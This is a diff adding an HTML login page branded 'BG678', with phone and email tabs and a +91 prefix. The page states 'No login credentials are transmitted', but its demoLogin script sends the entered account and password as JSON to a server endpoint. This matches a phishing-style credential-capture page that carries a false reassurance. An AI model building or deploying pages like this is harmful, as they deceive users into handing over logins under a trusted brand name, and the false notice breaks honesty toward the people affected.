@@ -1,0 +1,352 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BG678 - Login Portal</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    min-height: 100vh;
+    background: #f4f7f5;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+.container {
+    width: 100%;
+    max-width: 420px;
+    background: white;
+    border-radius: 18px;
+    overflow: hidden;
+    box-shadow: 0 8px 30px rgba(0,0,0,.10);
+}
+
+.header {
+    background: linear-gradient(135deg,#087b42,#13aa65);
+    color: white;
+    text-align: center;
+    padding: 24px 15px;
+}
+
+.logo {
+    width: 105px;
+    height: 105px;
+    margin: auto auto 10px;
+    border-radius: 50%;
+    border: 4px solid #e8bd51;
+    background: radial-gradient(circle,#16884b,#064a2c);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    box-shadow: 0 0 15px #e8bd51;
+}
+
+.crown {
+    font-size: 29px;
+}
+
+.logo strong {
+    color: #ffd86a;
+    font-size: 25px;
+    text-shadow: 1px 2px 3px #000;
+}
+
+.header h2 {
+    font-size: 21px;
+    margin-top: 10px;
+}
+
+.tabs {
+    display: flex;
+    margin: 22px 20px;
+    border-bottom: 1px solid #ddd;
+}
+
+.tab {
+    flex: 1;
+    padding: 13px;
+    border: none;
+    background: white;
+    font-size: 15px;
+    font-weight: bold;
+    color: #777;
+    cursor: pointer;
+}
+
+.tab.active {
+    color: #07934f;
+    border-bottom: 3px solid #07934f;
+}
+
+.form {
+    padding: 0 22px 25px;
+}
+
+label {
+    display: block;
+    font-size: 14px;
+    color: #333;
+    margin: 17px 0 8px;
+}
+
+.input-group {
+    display: flex;
+    align-items: center;
+    border: 1px solid #ddd;
+    border-radius: 9px;
+    overflow: hidden;
+    height: 49px;
+}
+
+.prefix {
+    padding: 0 12px;
+    color: #333;
+    border-right: 1px solid #ddd;
+}
+
+input {
+    width: 100%;
+    height: 100%;
+    border: none;
+    outline: none;
+    padding: 12px;
+    font-size: 15px;
+    background: transparent;
+}
+
+.password-wrap {
+    position: relative;
+}
+
+.password-wrap input {
+    border: 1px solid #ddd;
+    border-radius: 9px;
+    height: 49px;
+}
+
+.show-password {
+    position: absolute;
+    right: 13px;
+    top: 15px;
+    cursor: pointer;
+    color: #777;
+}
+
+.options {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin: 18px 0;
+    font-size: 13px;
+}
+
+.options label {
+    margin: 0;
+}
+
+.options a {
+    color: #07934f;
+    text-decoration: none;
+}
+
+.login-btn {
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(90deg,#078745,#13ad62);
+    border: none;
+    border-radius: 9px;
+    color: white;
+    font-size: 17px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.register-btn {
+    width: 100%;
+    padding: 14px;
+    margin-top: 13px;
+    background: white;
+    border: 1px solid #07934f;
+    border-radius: 9px;
+    color: #07934f;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+.notice {
+    margin-top: 17px;
+    text-align: center;
+    font-size: 12px;
+    color: #888;
+}
+
+.chat {
+    position: fixed;
+    right: 22px;
+    bottom: 22px;
+    width: 58px;
+    height: 58px;
+    background: #08a45a;
+    border-radius: 50%;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 27px;
+    box-shadow: 0 4px 12px #999;
+    cursor: pointer;
+}
+
+.message {
+    text-align: center;
+    color: #078745;
+    font-size: 13px;
+    margin-top: 12px;
+}
+
+@media(max-width:380px) {
+    .container {
+        border-radius: 12px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <div class="logo">
+            <span class="crown">👑</span>
+            <strong>BG678</strong>
+        </div>
+        <h2>Welcome Back</h2>
+        <p>Login to your account</p>
+    </div>
+
+    <div class="tabs">
+        <button class="tab active" id="phoneTab"
+        onclick="switchTab('phone')">Phone Login</button>
+
+        <button class="tab" id="emailTab"
+        onclick="switchTab('email')">Email Login</button>
+    </div>
+
+    <div class="form">
+
+        <label id="accountLabel">Mobile Number</label>
+
+        <div class="input-group">
+            <span class="prefix" id="prefix">+91</span>
+            <input type="text" id="account"
+            placeholder="Enter mobile number">
+        </div>
+
+        <label>Password</label>
+
+        <div class="password-wrap">
+            <input type="password" id="password"
+            placeholder="Enter password">
+            <span class="show-password"
+            onclick="togglePassword()">Show</span>
+        </div>
+
+        <div class="options">
+            <label>
+                <input type="checkbox" style="width:auto;height:auto">
+                Remember Password
+            </label>
+
+            <a href="#" onclick="demoMessage(event)">Forgot Password?</a>
+        </div>
+
+        <button class="login-btn" onclick="demoLogin()">
+            Login
+        </button>
+
+        <button class="register-btn" onclick="demoMessage(event)">
+            Register
+        </button>
+
+        <p class="notice">
+            Demo interface. No login credentials are transmitted.
+        </p>
+
+        <p class="message" id="message"></p>
+
+    </div>
+</div>
+
+<div class="chat" onclick="demoMessage(event)">
+    ☎
+</div>
+
+<script>
+
+let currentTab = "phone";
+
+function switchTab(type) {
+    currentTab = type;
+
+    document.getElementById("phoneTab")
+    .classList.toggle("active",type==="phone");
+
+    document.getElementById("emailTab")
+    .classList.toggle("active",type==="email");
+
+    document.getElementById("accountLabel").textContent =
+    type==="phone" ? "Mobile Number" : "Email Address";
+
+    document.getElementById("prefix").style.display =
+    type==="phone" ? "block" : "none";
+
+    document.getElementById("account").placeholder =
+    type==="phone" ? "Enter mobile number" : "Enter email address";
+}
+
+function togglePassword() {
+    const password = document.getElementById("password");
+
+    password.type =
+    password.type==="password" ? "text" : "password";
+}
+function demoLogin() {
+  const account = document.getElementById('account').value;
+  const password = document.getElementById('password').value;
+  const url = 'http://localhost:3000/submit';
+
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ account: account, password: password })
+  })
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById('message').textContent = data.message;
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+}
+
+
+
+</script>
+
+</body>
+</html>
